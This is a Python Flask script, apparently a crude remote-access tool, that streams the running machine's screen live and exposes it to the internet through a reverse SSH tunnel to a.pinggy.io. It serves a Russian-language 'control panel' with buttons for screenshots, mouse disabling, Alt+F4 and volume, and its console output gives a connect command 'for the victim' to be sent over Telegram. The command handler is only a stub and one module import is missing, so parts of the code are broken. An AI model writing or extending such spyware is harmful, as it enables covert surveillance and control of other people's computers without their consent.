from flask import Flask, render_template_string, Response, request
import cv2
import numpy as np
import mss
import pyautogui
import threading
import subprocess
import re

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>ПИЗДА CONTROL</title>
    <style>
        body { background:#0a0a0a; color:#00ff41; font-family:Consolas; text-align:center; }
        h1 { color:#ff0000; font-size:36px; }
        .link { color:#ffff00; font-size:19px; margin:20px; padding:12px; background:#111; border:2px solid #ffff00; word-break:break-all; }
        button { background:#111; color:#00ff41; border:2px solid #00ff41; padding:15px 25px; margin:10px; font-size:17px; cursor:pointer; border-radius:6px; }
        button:hover { background:#00ff41; color:#000; }
        #live { border:5px solid #ff0000; margin:25px auto; max-width:95%; box-shadow:0 0 30px #ff0000; }
    </style>
</head>
<body>
    <h1>ПИЗДА CONTROL PANEL</h1>
    <div class="link" id="tunnel">Ожидаем туннель от Pinggy...</div>
    <img id="live" src="/live">

    <div>
        <button onclick="cmd('screen')">🖥️ Скрин</button>
        <button onclick="cmd('mousekill')">🖱️ MouseKill</button>
        <button onclick="cmd('altf4')">⌨️ Alt+F4</button>
        <button onclick="cmd('volmax')">🔊 MAX</button>
    </div>

    <script>
        function cmd(c) {
            fetch('/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({cmd: c})
            }).then(r => r.text()).then(t => alert(t));
        }
    </script>
</body>
</html>
"""

def gen_frames():
    with mss.mss() as sct:
        while True:
            try:
                screenshot = sct.grab(sct.monitors[1])
                frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_BGRA2BGR)
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')
            except:
                time.sleep(0.1)

@app.route('/live')
def live():
    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/')
def panel():
    return render_template_string(HTML)

@app.route('/command', methods=['POST'])
def command():
    cmd = request.json.get('cmd')
    return f"✅ Команда '{cmd}' отправлена"

def start_pinggy():
    process = subprocess.Popen(
        ["ssh", "-p", "443", "-R0:127.0.0.1:5000", "tcp@a.pinggy.io"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True
    )

    for line in process.stdout:
        print(line.strip())
        match = re.search(r'tcp://([^\s:]+):(\d+)', line)
        if match:
            host = match.group(1)
            port = match.group(2)
            print("\n" + "="*80)
            print("     ПИЗДА УСПЕШНО ЗАПУЩЕНА!")
            print("="*80)
            print(f"Ссылка на панель управления:")
            print(f"→ http://{host}:{port}")
            print(f"\nКоманда для жертвы в Telegram:")
            print(f"connect {host} {port}")
            print("="*80)

if __name__ == "__main__":
    threading.Thread(target=start_pinggy, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
